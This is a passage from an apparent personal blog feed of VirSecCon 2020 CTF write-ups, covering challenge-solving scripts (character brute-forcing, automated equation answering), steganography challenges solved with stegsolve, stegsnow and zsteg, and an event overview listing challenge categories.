print(chars)
is_first = True
while(&quot;}&quot; not in flag):
    print(&quot;FLAG = &quot;,flag)
    #print(&quot;TRY.. &quot;,end=&quot;&quot;)
    if is_first :
        r.recvuntil(&quot;&amp;gt;&quot;)
    for char in chars:
        is_first = False
        print(char,end=&quot;&quot;)
        r.send(flag + char)
        lines = r.recvuntil('&amp;gt;').split(&quot;\n&quot;)
        #print(lines)
        if(&quot;CORRECT&quot; in lines[-3]):
            #print(&quot; OK &quot;,end=&quot;&quot;)
            flag+=char
            break
        else:
            #print(&quot; FALSE &quot;,end=&quot;&quot;)
            pass
    print(&quot;&quot;)

print(&quot;FINAL FLAG = &quot;,flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After running my script I got the flag and 125 points was added.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;........
abcdefghijklm                                                                                                                                         
FLAG =  LLS{bruteforce_with_a_hamm                                                                                                                    
abcde                                                                                                                                                 
FLAG =  LLS{bruteforce_with_a_hamme                                                                                                                   
abcdefghijklmnopqr                                                                                                                                    
FLAG =  LLS{bruteforce_with_a_hammer                                                                                                                  
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;amp;'()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}                                                         
FINAL FLAG =  LLS{bruteforce_with_a_hammer}                                                                                                           
[*] Closed connection to jh2i.com port 50012
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;6-calc-ul8r&quot;&gt;6. CALC-UL8R&lt;/h3&gt;

&lt;h4 id=&quot;description-150&quot;&gt;Description [150]&lt;/h4&gt;
&lt;p&gt;Texas Instruments latest new product: you!&lt;/p&gt;

&lt;p&gt;Connect with:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc jh2i.com 50003&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Solution:- As the challenge name was calculator so I had to enter the answer. But each time I enter the answer question changes randomly so I used the selelnium with a website &lt;a href=&quot;https://www.mathpapa.com/&quot;&gt;mathhapa.com&lt;/a&gt;. To solve this I wrote a simple python script.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from __future__ import print_function
from pwn import *
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options  
import urllib

url = &quot;https://www.mathpapa.com/algebra-calculator.html?q=&quot;
chrome_options = Options()  
chrome_options.add_argument(&quot;--headless&quot;)  
driver = webdriver.Chrome(&quot;/home/bikram/bbek/ctfscripting/chromedriver&quot;)
#nc jh2i.com 50003
r = remote('jh2i.com', 50003)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.recvline()
while True:
    soal = r.recvline()
    print(soal)
    resp = r.recvuntil(&quot;= &quot;)
    driver.get(url + urllib.quote(soal.replace(&quot;e&quot;,&quot;x&quot;)));
    driver.implicitly_wait(30)
    elements = driver.find_elements_by_css_selector(&quot;div#solout3 div.vspacediv fmath mn&quot;)
    text = 0
    i=0
    for element in elements:
        if(text==0):
            text = float(element.text)
        else:
            text /= float(element.text)
    if(text.is_integer()):
        text = str(int(text))
    else:
        text = str(float(text))
    r.send(text)
    print(&quot;ANSWER&quot;,text)
    print(r.recvline())
    

driver.close()   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At last this script lend me the flag:-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LLS{sympy_to_solve_equations}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I solved 6 challenges from scripting. Follow my blog to see more writeup of other catageory and I was able to solve more challenge from &lt;code class=&quot;highlighter-rouge&quot;&gt;Web&lt;/code&gt; Challenges which writeup is comming soon. Stay tuned.&lt;/p&gt;

&lt;p&gt;#Stay_safe&lt;/p&gt;

&lt;p&gt;#COVID-19&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="virseccon" /><category term="ctf" /><category term="scripting" /><category term="python" /><category term="selenium" /><category term="pwn" /><summary type="html">Introduction</summary></entry><entry><title type="html">VirSecCon CTF: Steganography Challenges</title><link href="http://localhost:4000/2020/04/07/virseccon-ctf-steganography.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Steganography Challenges" /><published>2020-04-07T00:00:00+05:45</published><updated>2020-04-07T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/07/virseccon-ctf-steganography</id><content type="html" xml:base="http://localhost:4000/2020/04/07/virseccon-ctf-steganography.html">&lt;h2 id=&quot;steganography&quot;&gt;Steganography&lt;/h2&gt;

&lt;p&gt;Steganography is the practice of concealing a file, message, image or video within another file, message, video or image. There are many tools that can be used in CTF to solve the steganography challenges such as Steghide, foremost, Stegsolve, Strings, Exiftool, Binwalk, Zsteg, Wavsteg, Stegsnow etc among these I only used 3 tools in VirSecCon CTF.&lt;/p&gt;

&lt;h3 id=&quot;1-stegosaurus&quot;&gt;1. Stegosaurus&lt;/h3&gt;

&lt;h4 id=&quot;description-70&quot;&gt;Description [70]&lt;/h4&gt;
&lt;p&gt;Scientists are struggling with a new mystery: we thought the dinosaurs were gone, but this one has returned! Hmmm… can you solve this mystery?&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/images/ctf/stegosaurus.png&quot;&gt;stegosaurus.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution:
	I solved this challenge using stegsolve tool you can download it &lt;a href=&quot;https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ls
stegsolve.jar
root@gr4n173:~$java -jar stegsolve.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then stegsolve was opened.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/dinosarus.png&quot; alt=&quot;dinosarous.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;then I got the flag finally and got the 70 points.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/stegosaurus_flag.png&quot; alt=&quot;stegosaurus_flag&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-winter-wonderland&quot;&gt;2. Winter Wonderland&lt;/h3&gt;

&lt;h4 id=&quot;description-80&quot;&gt;Description [80]&lt;/h4&gt;
&lt;p&gt;It’s the holiday season! But hmm… they must be hiding something under all that cheer!
Download the file below.&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/files/ctf/winter_wonderland.txt&quot;&gt;winter_wonderland.txt&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# cat winter_wonderland.txt
Oh the weather outside is frightful	  	      		 	   
But the fire is so delightful    	  	      	      	   	   
And since we've no place to go   	   	    	 	     	      
Let It Snow! Let It Snow! Let It Snow!     		     	       	     
     	    	      	     		     	       	     	   	      
It doesn't show signs of stopping      	      	 	   	       	     
And I've bought some corn for popping   	       	  	       	   
The lights are turned way down low   	    	    	 	    	      
Let It Snow! Let It Snow! Let It Snow!	 	       	 	     	      
       	      	      		   	  	     	   	 	  
When we finally kiss goodnight       	   	   	 	     	   
How I'll hate going out in the storm! 	  	       	   	       	    
But if you'll really hold me tight    	 	     	      	  	  
All the way home I'll be warm   	       	    	 	 	      
    	  	   	  	     	   	  	      	       	  
The fire is slowly dying
And, my dear, we're still goodbying
But as long as you love me so
Let It Snow! Let It Snow! Let It Snow!

Oh! It doesn't show signs of stopping
And I've bought some corn for popping
and The lights are turned way down low
Let It Snow! Let It Snow! Let It Snow!

All the way home I'll be warm!
All the way home I'll be warm!

The fire is slowly dying
And, my dear, we're still goodbying
But as long as you love me so
Let It Snow! Let It Snow! Let It Snow!

Let It Snow! Let It Snow! Let It Snow!


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I saw the word &lt;code class=&quot;highlighter-rouge&quot;&gt;snow&lt;/code&gt; many times so used &lt;code class=&quot;highlighter-rouge&quot;&gt;stegsnow&lt;/code&gt; tool.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# stegsnow winter_wonderland.txt
LLS{let_it_snow_baby_let_it_reindeer}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This way I got the flag and got the 80 points.&lt;/p&gt;

&lt;h3 id=&quot;3-elessbe&quot;&gt;3. Elessbe&lt;/h3&gt;

&lt;h4 id=&quot;description-80-1&quot;&gt;Description [80]&lt;/h4&gt;
&lt;p&gt;Ah, bonjour mon bon ami! Bienvenue  à la capture du drapeau! J’ai entendu dire que vous étiez fan de la  stéganographie! Avez-vous déjà entendu parler d’un outil appelé zsteg?
Download the file below:&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/images/ctf/elessbe.png&quot;&gt;elessbe.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution: As from the challenge name ‘Elessbe’= ‘lsb’ so I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;zsteg&lt;/code&gt; tool and got the least significant bits of the file using command below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# zsteg -a elessbe.png
file: Apple DiskCopy 4.2 image \376, 16842496 bytes, 0xff00 tag size, 0xff encoding, 0x0 format
b1,bgr,lsb,xy       .. text: &quot;LLS{lsb_est_mon_bon_ami}&quot;
b2,r,lsb,xy         .. file: 5View capture file
b2,r,msb,xy         .. file: VISX image file
b2,g,lsb,xy         .. file: 5View capture file
b2,g,msb,xy         .. file: VISX image file
b2,b,lsb,xy         .. file: 5View capture file
b2,b,msb,xy         .. file: VISX image file
b2,rgb,lsb,xy       .. file: 5View capture file
b2,rgb,msb,xy       .. file: VISX image file
b2,bgr,lsb,xy       .. file: 5View capture file
b2,bgr,msb,xy       .. file: VISX image file
b4,r,msb,xy         .. text: [&quot;w&quot; repeated 9 times]
b4,g,msb,xy         .. text: [&quot;w&quot; repeated 12 times]
b4,b,msb,xy         .. text: [&quot;w&quot; repeated 10 times]
b4,rgb,msb,xy       .. text: [&quot;w&quot; repeated 28 times]
b4,bgr,msb,xy       .. text: [&quot;w&quot; repeated 29 times]
b8,r,msb,xy         .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,g,msb,xy         .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,b,msb,xy         .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,rgb,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,bgr,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b2,g,lsb,xy,prime   .. file: SoftQuad DESC or font file binary
b2,g,msb,xy,prime   .. file: VISX image file
b2,b,lsb,xy,prime   .. file: SoftQuad DESC or font file binary
b2,b,msb,xy,prime   .. file: VISX image file
b2,rgb,lsb,xy,prime .. file: 5View capture file
b2,rgb,msb,xy,prime .. file: VISX image file
b2,bgr,lsb,xy,prime .. file: 5View capture file
b2,bgr,msb,xy,prime .. file: VISX image file
b4,rgb,msb,xy,prime .. text: [&quot;w&quot; repeated 10 times]
b4,bgr,msb,xy,prime .. text: [&quot;w&quot; repeated 11 times]
b8,r,msb,xy,prime   .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,g,msb,xy,prime   .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,b,msb,xy,prime   .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,rgb,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b8,bgr,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b2,r,msb,yx         .. text: [&quot;U&quot; repeated 18 times]
b2,rgb,msb,yx       .. text: [&quot;U&quot; repeated 12 times]
b4,r,msb,yx         .. text: [&quot;w&quot; repeated 8 times]
b8,rgb,msb,yx       .. file: RDI Acoustic Doppler Current Profiler (ADCP)
b2,rgb,msb,yx,prime .. text: &quot;WUUUUUUU&quot;
b4,rgb,msb,yx,prime .. text: [&quot;w&quot; repeated 16 times]
b2,r,lsb,XY         .. file: VISX image file
b2,r,msb,XY         .. file: 5View capture file
b2,g,lsb,XY         .. file: VISX image file
b2,g,msb,XY         .. file: 5View capture file
b2,b,lsb,XY         .. file: VISX image file
b2,b,msb,XY         .. file: 5View capture file
b2,rgb,lsb,XY       .. file: VISX image file
b2,rgb,msb,XY       .. file: 5View capture file
b2,bgr,lsb,XY       .. file: VISX image file
b2,bgr,msb,XY       .. file: 5View capture file
b4,r,msb,XY         .. text: [&quot;w&quot; repeated 28 times]
b4,g,msb,XY         .. text: [&quot;w&quot; repeated 28 times]
b4,b,msb,XY         .. text: [&quot;w&quot; repeated 28 times]
b8,g,msb,XY         .. text: [&quot;?&quot; repeated 8 times]
b8,rgb,msb,XY       .. text: &quot;#m\r\rCMM3&quot;
b1,r,lsb,XY,prime   .. file: MPEG ADTS, layer II, v1, 48 kHz, JntStereo
b1,g,lsb,XY,prime   .. file: MPEG ADTS, layer II, v1,  64 kbps, JntStereo
b2,r,lsb,XY,prime   .. file: VISX image file
b2,r,msb,XY,prime   .. file: SoftQuad DESC or font file binary
b2,g,lsb,XY,prime   .. file: VISX image file
b2,g,msb,XY,prime   .. file: SoftQuad DESC or font file binary
b2,b,lsb,XY,prime   .. file: VISX image file
b2,b,msb,XY,prime   .. file: SoftQuad DESC or font file binary - version 10922
b2,rgb,lsb,XY,prime .. file: VISX image file
b2,rgb,msb,XY,prime .. file: 5View capture file
b2,bgr,lsb,XY,prime .. file: VISX image file
b2,bgr,msb,XY,prime .. file: 5View capture file
b4,b,msb,XY,prime   .. text: &quot;\&quot;7233333&quot;
b4,rgb,msb,XY,prime .. text: [&quot;w&quot; repeated 13 times]
b4,bgr,msb,XY,prime .. text: [&quot;w&quot; repeated 13 times]
b1,b,lsb,YX         .. file: Targa image data - RLE 58075 x 25368 x 24 +56227 +9435 - 13-bit alpha - top - reserved &quot;\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377&quot;
b1,b,msb,YX         .. file: Targa image data - RLE 18395 x 50712 x 24 +56261 +9435 - 7-bit alpha - top - right - four way interleave &quot;\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377&quot;
b2,r,lsb,YX         .. file: VISX image file (zero)
b2,r,msb,YX         .. file: SoftQuad DESC or font file binary
b2,g,lsb,YX         .. file: VISX image file (zero)
b2,g,msb,YX         .. file: SoftQuad DESC or font file binary
b2,b,lsb,YX         .. file: VISX image file (zero)
b2,b,msb,YX         .. file: SoftQuad DESC or font file binary
b2,rgb,lsb,YX       .. file: VISX image file
b2,rgb,msb,YX       .. file: 5View capture file
b2,bgr,lsb,YX       .. file: VISX image file
b2,bgr,msb,YX       .. file: 5View capture file
b4,r,lsb,YX         .. text: &quot;wvEgTfeeUC!&quot;
b4,g,lsb,YX         .. text: &quot;wwveUUTC32&quot;
b4,b,lsb,YX         .. text: &quot;feTDOZBSDC2\&quot;&quot;
b4,rgb,lsb,YX       .. text: &quot;W4sG4sF\#@&quot;
b4,rgb,msb,YX       .. text: [&quot;3&quot; repeated 12 times]
b4,bgr,msb,YX       .. text: [&quot;3&quot; repeated 12 times]
b8,r,msb,YX         .. text: [&quot;?&quot; repeated 8 times]
b8,g,msb,YX         .. text: [&quot;?&quot; repeated 8 times]
b8,b,msb,YX         .. text: [&quot;?&quot; repeated 11 times]
b8,rgb,msb,YX       .. text: [&quot;?&quot; repeated 24 times]
b8,bgr,msb,YX       .. text: [&quot;?&quot; repeated 25 times]
b1,rgb,lsb,YX,prime .. file: MPEG ADTS, AAC, v4 Main, surround + side
b1,bgr,lsb,YX,prime .. file: MPEG ADTS, AAC, v4 Main, 22.05 kHz, monaural
b2,rgb,lsb,YX,prime .. file: VISX image file
b2,rgb,msb,YX,prime .. file: SoftQuad DESC or font file binary - version 170
b2,bgr,lsb,YX,prime .. file: VISX image file
b2,bgr,msb,YX,prime .. file: SoftQuad DESC or font file binary - version 170
b4,r,msb,Xy         .. text: [&quot;w&quot; repeated 9 times]
b4,g,msb,Xy         .. text: [&quot;w&quot; repeated 12 times]
b4,b,msb,Xy         .. text: [&quot;w&quot; repeated 10 times]
b1,r,lsb,Xy,prime   .. file: AIX core file fulldump 32-bit
b1,g,lsb,Xy,prime   .. file: MPEG ADTS, layer II, v1, JntStereo
b1,b,lsb,Xy,prime   .. file: AIX core file fulldump 32-bit
b4,r,lsb,yX         .. text: &quot;4UVVfEvTgwx&quot;
b4,g,lsb,yX         .. text: &quot;#34EUUVgwwx&quot;
b4,b,lsb,yX         .. text: &quot;2!4DEVffgx&quot;
b1,rgb,lsb,xY       .. file: dBase III DBT, version number 0, next free block index 4294967295
b1,rgb,msb,xY       .. file: dBase III DBT, version number 0, next free block index 4294967295
b1,bgr,lsb,xY       .. file: dBase III DBT, version number 0, next free block index 4294967295
b1,bgr,msb,xY       .. file: dBase III DBT, version number 0, next free block index 4294967295
b2,r,lsb,xY         .. text: [&quot;U&quot; repeated 28 times]
b2,r,msb,xY         .. text: [&quot;U&quot; repeated 14 times]
b2,g,lsb,xY         .. text: [&quot;U&quot; repeated 28 times]
b2,g,msb,xY         .. text: [&quot;U&quot; repeated 14 times]
b2,b,lsb,xY         .. text: [&quot;U&quot; repeated 30 times]
b2,b,msb,xY         .. text: [&quot;U&quot; repeated 14 times]
b2,rgb,lsb,xY       .. text: [&quot;U&quot; repeated 84 times]
b2,rgb,msb,xY       .. text: [&quot;U&quot; repeated 42 times]
b2,bgr,lsb,xY       .. text: &quot;UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUI$&quot;
b2,bgr,msb,xY       .. text: [&quot;U&quot; repeated 42 times]
b4,r,msb,xY         .. text: [&quot;w&quot; repeated 28 times]
b4,g,msb,xY         .. text: [&quot;w&quot; repeated 28 times]
b4,b,msb,xY         .. text: [&quot;w&quot; repeated 28 times]
b4,rgb,msb,xY       .. text: [&quot;w&quot; repeated 84 times]
b8,g,msb,xY         .. text: [&quot;?&quot; repeated 8 times]
b2,r,lsb,xY,prime   .. text: &quot;UUUUU[bk&quot;
b2,rgb,lsb,xY,prime .. text: &quot;UUUUUUUUUUUUUUUUX&quot;
b2,rgb,msb,xY,prime .. text: [&quot;U&quot; repeated 9 times]
b2,bgr,lsb,xY,prime .. text: &quot;UUUUUUUUUUUUUUUUT&quot;
b2,bgr,msb,xY,prime .. text: [&quot;U&quot; repeated 9 times]
b4,r,msb,xY,prime   .. text: &quot;{w733333&quot;
b4,g,msb,xY,prime   .. text: &quot;{w733333&quot;
b4,b,msb,xY,prime   .. text: &quot;{w7333333&quot;
b4,rgb,msb,xY,prime .. text: [&quot;w&quot; repeated 19 times]
b4,bgr,msb,xY,prime .. text: [&quot;w&quot; repeated 19 times]
b1,rgb,lsb,Yx       .. file: dBase III DBT, version number 0, next free block index 4294967295
b1,rgb,msb,Yx       .. file: dBase III DBT, version number 0, next free block index 4294967295
b2,r,msb,Yx         .. text: [&quot;U&quot; repeated 18 times]
b2,rgb,msb,Yx       .. text: [&quot;U&quot; repeated 54 times]
b4,r,msb,Yx         .. text: [&quot;w&quot; repeated 36 times]
b4,rgb,msb,Yx       .. text: [&quot;w&quot; repeated 108 times]
b2,r,lsb,Yx,prime   .. file: MPEG ADTS, layer III, v1, 160 kbps, 32 kHz, 2x Monaural
b2,g,lsb,Yx,prime   .. file: MPEG ADTS, layer III, v1, 160 kbps, 32 kHz, 2x Monaural
b2,b,lsb,Yx,prime   .. file: MPEG ADTS, layer III, v1, 160 kbps, 32 kHz, 2x Monaural
b2,rgb,msb,Yx,prime .. text: &quot;_UUUUUUUUUUUU&quot;
b3,rgb,msb,Yx,prime .. file: AIX core file fulldump 64-bit
b4,r,msb,Yx,prime   .. text: [&quot;w&quot; repeated 8 times]

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This way I got the flag and 80 points was added .&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="VirSecCon" /><category term="VSCCTF" /><category term="ctf" /><category term="steganography" /><summary type="html">Steganography</summary></entry><entry><title type="html">CTF: VirSecCon2020</title><link href="http://localhost:4000/2020/04/06/virseccon.html" rel="alternate" type="text/html" title="CTF: VirSecCon2020" /><published>2020-04-06T00:00:00+05:45</published><updated>2020-04-06T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/06/virseccon</id><content type="html" xml:base="http://localhost:4000/2020/04/06/virseccon.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;As due to the outbreak of the Corona virus that start from late 2019 known as &lt;code class=&quot;highlighter-rouge&quot;&gt;COVID-19&lt;/code&gt;every big National as well as International Cyber Security Conference was canceled. So In regard that, two well-renowned hackers &lt;a href=&quot;https://twitter.com/NahamSec&quot;&gt;NahamSec&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt;(also known as The Cyber Mentor[TCM]) organized a Virtual Security Conference (VirSecCon2020). The conference was conducted free and all the sponsors funds from this conference goes to &lt;a href=&quot;https://www.lls.org&quot;&gt;LLSusa&lt;/a&gt;. Conference was full of talks from renowned and most reputed hackers all around the world.&lt;/p&gt;

&lt;h4 id=&quot;talks-&quot;&gt;Talks:-&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/TomNomNom&quot;&gt;TomNomNom&lt;/a&gt;:- &lt;strong&gt;Bug Bounties With Bash&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/d0nutptr&quot;&gt;d0nutptr&lt;/a&gt;:- &lt;strong&gt;Practical Exploitation of Insecure Randomness on V8&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/zseano&quot;&gt;zseano&lt;/a&gt;:- &lt;strong&gt;Unique mindset – Hacking with zseano&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/uraniumhacker&quot;&gt;uraniumhacker&lt;/a&gt;:- &lt;strong&gt;Protecting your internal assets from enterprise misconfigurations&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/stokfredrik&quot;&gt;Stokfredrik&lt;/a&gt;:- &lt;strong&gt;From NOOB to MVH: What does it really take&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/ChloeMessdaghi&quot;&gt;ChloeMessdaghi&lt;/a&gt;:- &lt;strong&gt;Hacker Rights&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/niden&quot;&gt;niden&lt;/a&gt;:- &lt;strong&gt;Try Harder? Keep Trying! Demystifying the OSCP &amp;amp; OSCE Certifications&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/B3nac&quot;&gt;b3nac&lt;/a&gt;:- &lt;strong&gt;Android Hacking&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/erbbysam&quot;&gt;erbbysam&lt;/a&gt;:- &lt;strong&gt;Hostnames: Trials, Tribulations &amp;amp; VHost Misconfiguration&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/ethicalhacker&quot;&gt;EthicalHacker&lt;/a&gt;:- &lt;strong&gt;IoT Hacking Basics – Fun with UPnP and a Smart Outlet&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/dawnisabel&quot;&gt;DawnIsabel&lt;/a&gt;:- &lt;strong&gt;iOS Recon with Radare2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;These talks was on April 4, 2020 in &lt;a href=&quot;https://www.twitch.tv/nahamsec&quot;&gt;Nahamsec&lt;/a&gt; twitch channel.&lt;/p&gt;

&lt;p&gt;Before these talks i.e on April 3, 2020 they organized a Virtual Security Conference CTF (VSC CTF) which was fully helped and hosted by &lt;a href=&quot;https://twitter.com/_johnhammond&quot;&gt;John Hammond&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/vscctf.jpg&quot; alt=&quot;vscctf&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VSC CTF was live for 29.5 hours in &lt;a href=&quot;https://ctf.virseccon.com/&quot;&gt;ctf.virseccon.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;VSC CTF was divided into 9 Challenges and among them I was able to solve the below challenges which lend me to secure a rank among top 50 teams &lt;code class=&quot;highlighter-rouge&quot;&gt;rank 46/2513&lt;/code&gt; with points 3720 pts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/virseccon_rank.jpg&quot; alt=&quot;virseccon_rank&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;steganography&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/07/virseccon-ctf-steganography.html&quot;&gt;Steganography&lt;/a&gt;:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- Stegosaurus
	- Winter Wonderland
	- Elessbe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scripting&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/13/virseccon-ctf-scripting.html&quot;&gt;Scripting&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- 2048
	- Pincode
	- Quick Run
	- Grammer
	- Loopback
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;https://gr4n173.github.io/2020/04/13/virseccon-ctf-web.html&quot;&gt;Web&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            - 10 Character Web Shell
            - GET Encoded
            - Sequelitis
            - GLHF
            - PHPJuggler
            - Magician
            - JaWT
            - MASK
            - Dairy Products
            - Irregular Expressions
            - Eyeless
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;binary&quot;&gt;Binary:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- Count Dracula
	- Buff The Barque
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;forensic&quot;&gt;Forensic:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- I Lost My Password
	- Tragic Number
	- QUACK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;miscellaneous&quot;&gt;Miscellaneous&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- Hidden
	- Linux Kiosk
	- Catalias
	- Chasm
	- MissingCho
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	- Chief Executive Officer
	- Polybius
	- Classic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;warmup&quot;&gt;Warmup&lt;/h3&gt;

&lt;h3 id=&quot;social-media&quot;&gt;Social Media&lt;/h3&gt;

